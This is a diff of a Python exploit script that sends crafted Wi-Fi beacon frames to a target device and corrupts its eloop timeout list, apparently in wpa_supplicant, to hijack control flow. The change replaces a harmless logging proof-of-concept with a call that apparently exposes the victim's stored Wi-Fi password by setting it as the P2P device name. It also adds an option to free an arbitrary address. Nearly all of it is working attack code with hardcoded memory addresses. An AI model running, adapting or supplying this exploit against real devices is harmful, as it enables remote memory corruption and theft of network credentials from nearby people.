@@ -15,20 +15,25 @@ parser.add_argument('-i', dest='interface', required=True,
     help='network interface in monitor mode')
 parser.add_argument('-t', dest='target', required=True, 
     help='target MAC address')
+parser.add_argument('--exploit', action='store_true', help='free arbitrary address')
 args = parser.parse_args()
 
 iface = args.interface        # interface in monitor mode
 target = args.target          # target MAC address
 
-base  = 0x5555555000          # base address of main module
-eloop = 0x7fb743d1c0          # eloop_timeout address
-p2    = 0x7fb742e500          # second part of payload
+base  = 0x558ed61000          # base address of main module
 
-eloop_next = base + 0x1a76b0  # eloop next (&list terminates)
-wpa_printf = base + 0x1a938   # addr of wpa_printf
+eloop = 0x7fb6e32780          # eloop_timeout address
+p2    = 0x7fb6e2f320          # second part of payload
+p2p_data = 0x7fb6e98000       # first parm of p2p_set_dev_name
+passwd   = 0x7fb6e2b460       # address of Wi-Fi password
 
-msg = b"hi :)"                # log on success (< 8 bytes)
-frees = [eloop-0x20]          # list of addrs to free (up to 10)
+eloop_next = base + 0x1f0770  # eloop next (&list terminates)
+# wpa_printf = base + 0x027d48  # addr of wpa_printf
+
+p2p_set_dev_name = base + 0x060c3c
+
+frees = [eloop-0x20] if args.exploit else [] # list of addrs to free (up to 10)
 sec_devs = 0x12+len(frees)    # number of secondary device types
 
 p64 = lambda x: struct.pack("<Q", x)
@@ -61,9 +66,9 @@ def build_beacon(dev_mac, client_mac):
         p64(eloop_next) +            # next: address of terminator
         p64(eloop) +                 # previous: address of ext_data1
         p64(0) + p64(0) +            # times set to 0 so it runs right away
-        p64(5) + p64(p2+0x38) +      # error level, address of msg 
-        p64(wpa_printf) +            # addr of wpa_printf to jump to 
-        msg + b"\x00"*(8-len(msg)))  # message and null padding
+        p64(p2p_data) + p64(passwd) +      # arguments of p2p_set_dev_name function
+        p64(p2p_set_dev_name) +            # addr of p2p_set_dev_name to jump to 
+        p64(0))
 
     vendor2 = Dot11EltVendorSpecific(oui=0x0050f2, info=(
         b"\x04\x10\x49" +                    # vendor extension id
